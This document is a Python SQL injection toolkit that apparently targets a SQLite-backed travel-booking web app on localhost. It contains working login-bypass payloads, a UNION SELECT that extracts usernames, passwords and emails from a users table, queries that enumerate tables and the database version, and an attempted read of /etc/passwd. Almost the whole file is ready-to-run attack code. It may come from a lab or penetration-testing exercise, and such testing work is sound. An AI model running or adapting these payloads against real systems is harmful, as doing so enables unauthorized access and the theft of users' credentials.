#!/usr/bin/env python3
"""sqli_manual.py - manual sql injection attacks against the target"""

import argparse
import json
import re
import sys
import time

import requests
from colorama import Fore, Style, init

init(autoreset=True)


def banner():
    print(f"{Fore.CYAN}{'='*60}")
    print(f"  sqli_manual.py - sql injection toolkit")
    print(f"{'='*60}{Style.RESET_ALL}\n")


def test_auth_bypass(base_url):
    """try various sql injection payloads on the login form"""
    print(f"{Fore.YELLOW}[*] testing authentication bypass...")
    login_url = f"{base_url}/login"

    payloads = [
        {"username": "' OR '1'='1' --", "password": "anything"},
        {"username": "' OR 1=1 --", "password": "anything"},
        {"username": "admin' --", "password": "anything"},
        {"username": "' OR '1'='1'/*", "password": "anything"},
        {"username": "admin'/*", "password": "anything"},
        {"username": "' OR 1=1#", "password": "anything"},
        {"username": "admin' OR '1'='1", "password": "admin' OR '1'='1"},
    ]

    results = []
    for payload in payloads:
        try:
            session = requests.Session()
            session.get(login_url, timeout=5)

            resp = session.post(login_url, data=payload, timeout=5,
                                allow_redirects=False)

            # on success the app returns 302 redirect to /
            success = resp.status_code == 302

            if not success:
                # also check if we ended up on a logged-in page
                resp2 = session.post(login_url, data=payload, timeout=5,
                                     allow_redirects=True)
                body = resp2.text.lower()
                if "logout" in body or "profile" in body:
                    success = True

            result = {
                "payload": payload,
                "status_code": resp.status_code,
                "success": success,
                "redirect_url": resp.headers.get("Location", "")
            }
            results.append(result)

            if success:
                print(f"{Fore.RED}  [+] auth bypass successful: {payload['username']}")
            else:
                print(f"{Fore.GREEN}  [-] blocked: {payload['username'][:40]}")

        except requests.ConnectionError:
            print(f"{Fore.RED}  [!] connection failed")
            break

    return results


def union_extract_users(base_url):
    """use union-based sqli to pull user data from the database"""
    print(f"\n{Fore.YELLOW}[*] attempting UNION-based data extraction...")
    search_url = f"{base_url}/search"
    results = {"users": [], "method": None}

    # the packages table has 7 columns: id, name, destination, description, price, duration_days, image_url
    # the search results template renders name (col 2) and destination (col 3)
    # so we put extracted data in those positions
    col_count = 7
    print(f"{Fore.YELLOW}  [*] using {col_count} columns (packages table)")

    # extract all users in one shot via union select
    # use a prefix that won't match any packages so only union rows appear
    # username goes in name position (col 2), password in destination (col 3)
    payload = (
        "zzzznotfound' UNION SELECT 1,username,password,email,"
        "5,6,phone FROM users--"
    )
    try:
        resp = requests.get(search_url, params={"q": payload}, timeout=5)
        if resp.status_code == 200:
            # h3 has username, dest div has password (with emoji prefix)
            usernames = re.findall(r'<h3>([a-zA-Z0-9_]+)</h3>', resp.text)
            passwords = re.findall(r'<div class="dest">[^<]*?([a-zA-Z0-9_!@#$%^&*]+)</div>', resp.text)

            for i, user in enumerate(usernames):
                passwd = passwords[i] if i < len(passwords) else "unknown"
                if not any(u["username"] == user for u in results["users"]):
                    print(f"{Fore.RED}  [+] extracted: {user}:{passwd}")
                    results["users"].append({"username": user, "password": passwd})
    except requests.ConnectionError:
        print(f"{Fore.RED}  [!] connection failed")

    if results["users"]:
        results["method"] = "UNION SELECT with 7 columns"

    if not results["users"]:
        print(f"{Fore.YELLOW}  [*] no data extracted via union")

    return results


def enumerate_database(base_url):
    """try to enumerate database structure via sqli"""
    print(f"\n{Fore.YELLOW}[*] enumerating database structure...")
    search_url = f"{base_url}/search"
    db_info = {"tables": [], "version": None}

    # get sqlite version - put it in name column (position 2)
    payload = "zzzznotfound' UNION SELECT 1,sqlite_version(),'','',5,6,'' FROM sqlite_master LIMIT 1--"
    try:
        resp = requests.get(search_url, params={"q": payload}, timeout=5)
        version_match = re.search(r'<h3>(\d+\.\d+\.\d+)</h3>', resp.text)
        if version_match:
            db_info["version"] = version_match.group(1)
            print(f"{Fore.RED}  [+] database version: {db_info['version']}")
    except requests.ConnectionError:
        pass

    # enumerate tables
    payload = "zzzznotfound' UNION SELECT 1,group_concat(name),'','',5,6,'' FROM sqlite_master WHERE type='table'--"
    try:
        resp = requests.get(search_url, params={"q": payload}, timeout=5)
        if resp.status_code == 200:
            # look for table names in h3 tags
            h3_match = re.findall(r'<h3>([^<]+)</h3>', resp.text)
            for match in h3_match:
                # the group_concat result will have comma-separated table names
                tables = [t.strip() for t in match.split(",")]
                for t in tables:
                    if t and t not in db_info["tables"] and not t.startswith("€"):
                        # skip things that look like package names
                        if len(t) < 30 and " " not in t:
                            db_info["tables"].append(t)
            if db_info["tables"]:
                print(f"{Fore.RED}  [+] found tables: {', '.join(db_info['tables'])}")
    except requests.ConnectionError:
        pass

    if not db_info["tables"]:
        print(f"{Fore.YELLOW}  [*] could not enumerate tables automatically")

    return db_info


def try_file_read(base_url):
    """attempt to read files through sqli - sqlite specific"""
    print(f"\n{Fore.YELLOW}[*] attempting file read via SQLi...")
    # sqlite doesn't support load_file, so this is mostly a no-op
    # but we try anyway for completeness
    search_url = f"{base_url}/search"
    files_read = []

    targets = ["/etc/passwd", "/etc/hosts"]
    for target_file in targets:
        payload = f"' UNION SELECT 1,'{target_file}','not supported in sqlite','',5,6,''--"
        try:
            resp = requests.get(search_url, params={"q": payload}, timeout=5)
            # sqlite cant read files, just note that
        except requests.ConnectionError:
            break

    print(f"{Fore.GREEN}  [-] file read not possible (sqlite)")
    return files_read


def run_sqli(target_url):
    """main sqli routine, returns all findings"""
    banner()
    results = {
        "target": target_url,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "auth_bypass": [],
        "extracted_data": {},
        "database_info": {},
        "file_read": []
    }

    results["auth_bypass"] = test_auth_bypass(target_url)
    results["extracted_data"] = union_extract_users(target_url)
    results["database_info"] = enumerate_database(target_url)
    results["file_read"] = try_file_read(target_url)

    bypasses = sum(1 for r in results["auth_bypass"] if r.get("success"))
    users_found = len(results["extracted_data"].get("users", []))
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"  sqli scan complete")
    print(f"  auth bypasses: {bypasses}/{len(results['auth_bypass'])}")
    print(f"  users extracted: {users_found}")
    print(f"  tables found: {len(results['database_info'].get('tables', []))}")
    print(f"  files read: {len(results['file_read'])}")
    print(f"{'='*60}{Style.RESET_ALL}")

    return results


def main():
    parser = argparse.ArgumentParser(description="sqli_manual.py - sql injection attacks")
    parser.add_argument("-t", "--target", default="http://localhost:5000",
                        help="target URL")
    parser.add_argument("-o", "--output", default="sqli_results.json",
                        help="output file")
    args = parser.parse_args()

    results = run_sqli(args.target)

    with open(args.output, "w") as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\n{Fore.GREEN}[+] results saved to {args.output}")


if __name__ == "__main__":
    main()
